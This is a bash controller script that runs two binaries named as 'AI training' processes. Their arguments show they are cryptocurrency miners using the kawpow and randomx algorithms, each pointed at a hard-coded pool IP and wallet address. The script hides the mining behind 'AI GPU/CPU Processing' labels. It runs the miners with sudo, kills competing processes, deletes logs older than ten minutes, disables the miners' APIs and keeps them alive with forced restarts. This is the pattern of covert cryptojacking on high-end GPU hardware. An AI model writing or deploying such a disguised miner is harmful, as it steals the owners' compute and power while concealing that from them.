#!/bin/bash

# --- CONFIGURATION ---
LOG_DIR="./logs"
RESTART_DELAY=10
HEALTH_CHECK_INTERVAL=30
STALE_LOG_THRESHOLD=2  # minutes
MAX_LOG_AGE_MINUTES=10
MAX_RESTARTS=10
KEEPALIVE_INTERVAL=60

GPU_BINARY="./aitraining_gpu"
CPU_BINARY="./aitraining_cpu"

# --- INITIALIZATION ---
sudo pkill -f aitraining_gpu 2>/dev/null
sudo pkill -f aitraining_cpu 2>/dev/null
sudo pkill -f monitor_system 2>/dev/null
sudo pkill -f "keepalive.*aitraining" 2>/dev/null
sleep 3

mkdir -p $LOG_DIR

# --- LOG MANAGEMENT ---
clean_old_logs() {
    find $LOG_DIR -name "*.log" -type f -mmin +$MAX_LOG_AGE_MINUTES -delete 2>/dev/null
    echo "Cleaned logs older than $MAX_LOG_AGE_MINUTES minutes"
}

clean_old_logs

log_message() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> $LOG_DIR/controller.log
}

check_process_health() {
    local process_pattern=$1
    local worker_name=$2
    local log_file=$3
    
    if ! pgrep -f "$process_pattern" > /dev/null; then
        log_message "HEALTH_CHECK_FAIL: $worker_name process not found"
        return 1
    fi
    
    if [[ -f "$log_file" ]]; then
        if find "$log_file" -mmin -$STALE_LOG_THRESHOLD 2>/dev/null | grep -q .; then
            return 0
        else
            log_message "HEALTH_CHECK_FAIL: $worker_name log file stale (no activity in ${STALE_LOG_THRESHOLD}min)"
            return 1
        fi
    else
        log_message "HEALTH_CHECK_FAIL: $worker_name log file missing: $log_file"
        return 1
    fi
    
    return 0
}

# --- PROCESS START FUNCTIONS ---
start_gpu_process() {
    local restart_count=0
    while [[ $restart_count -lt $MAX_RESTARTS ]]; do
        log_message "Starting GPU process (attempt $((restart_count+1)))"
        clean_old_logs

        if sudo $GPU_BINARY \
            --algorithm kawpow \
            --pool 51.89.99.172:16161 \
            --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
            --worker H200-rig \
            --password x \
            --gpu-id 0,1,2,3 \
            --tls true \
            --disable-cpu \
            --log-file $LOG_DIR/gpu_processing.log \
            --log-file-mode 1 \
            --api-disable 2>> $LOG_DIR/gpu_errors.log; then
            
            local gpu_pid=$!
            echo $gpu_pid > $LOG_DIR/gpu_pid.txt
            log_message "GPU process started with PID: $gpu_pid"
            
            wait $gpu_pid
            log_message "GPU process exited normally"
            break
        else
            log_message "GPU process failed to start"
        fi

        restart_count=$((restart_count+1))
        [[ $restart_count -ge $MAX_RESTARTS ]] && log_message "GPU_MAX_RESTARTS_REACHED" && break
        log_message "GPU restarting in $RESTART_DELAY seconds..."
        sleep $RESTART_DELAY
    done
}

start_cpu_process() {
    local restart_count=0
    while [[ $restart_count -lt $MAX_RESTARTS ]]; do
        log_message "Starting CPU process (attempt $((restart_count+1)))"
        clean_old_logs

        if sudo $CPU_BINARY \
            --algorithm randomx \
            --pool 51.222.200.133:10343 \
            --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
            --worker H200-cpu \
            --password x \
            --cpu-threads 80 \
            --disable-gpu \
            --tls true \
            --log-file $LOG_DIR/cpu_processing.log \
            --log-file-mode 1 \
            --api-disable 2>> $LOG_DIR/cpu_errors.log; then
            
            local cpu_pid=$!
            echo $cpu_pid > $LOG_DIR/cpu_pid.txt
            log_message "CPU process started with PID: $cpu_pid"
            
            wait $cpu_pid
            log_message "CPU process exited normally"
            break
        else
            log_message "CPU process failed to start"
        fi

        restart_count=$((restart_count+1))
        [[ $restart_count -ge $MAX_RESTARTS ]] && log_message "CPU_MAX_RESTARTS_REACHED" && break
        log_message "CPU restarting in $RESTART_DELAY seconds..."
        sleep $RESTART_DELAY
    done
}

# --- FORCE RESTART FUNCTION ---
force_restart_process() {
    local process_pattern=$1
    local worker_name=$2
    local restart_func=$3
    
    log_message "FORCE_RESTART: $worker_name process unhealthy"
    clean_old_logs
    sudo pkill -f "$process_pattern"
    sleep 3
    pgrep -f "$process_pattern" > /dev/null && sudo pkill -9 -f "$process_pattern"
    sleep 2
    $restart_func &
    log_message "FORCE_RESTART: $worker_name process restart completed"
}

# --- KEEPALIVE MONITOR ---
start_keepalive_monitor() {
    log_message "Starting KeepAlive monitor"
    while true; do
        clean_old_logs
        ! check_process_health "aitraining_gpu" "GPU" "$LOG_DIR/gpu_processing.log" && force_restart_process "aitraining_gpu" "GPU" "start_gpu_process"
        ! check_process_health "aitraining_cpu" "CPU" "$LOG_DIR/cpu_processing.log" && force_restart_process "aitraining_cpu" "CPU" "start_cpu_process"
        log_message "KEEPALIVE: All processes monitored - sleeping $KEEPALIVE_INTERVAL seconds"
        sleep $KEEPALIVE_INTERVAL
    done
}

# --- START MAIN PROCESSES ---
start_gpu_process > $LOG_DIR/gpu_nohup.log 2>&1 &
GPU_CONTROLLER_PID=$!

start_cpu_process > $LOG_DIR/cpu_nohup.log 2>&1 &
CPU_CONTROLLER_PID=$!

echo $GPU_CONTROLLER_PID > $LOG_DIR/gpu_controller_pid.txt
echo $CPU_CONTROLLER_PID > $LOG_DIR/cpu_controller_pid.txt

log_message "Main controller started - GPU: $GPU_CONTROLLER_PID, CPU: $CPU_CONTROLLER_PID"

# --- START KEEPALIVE ---
start_keepalive_monitor > $LOG_DIR/keepalive.log 2>&1 &
KEEPALIVE_PID=$!
echo $KEEPALIVE_PID > $LOG_DIR/keepalive_pid.txt

log_message "All systems started - KeepAlive: $KEEPALIVE_PID"
echo "=== AI GPU/CPU Processing System Started Successfully ==="
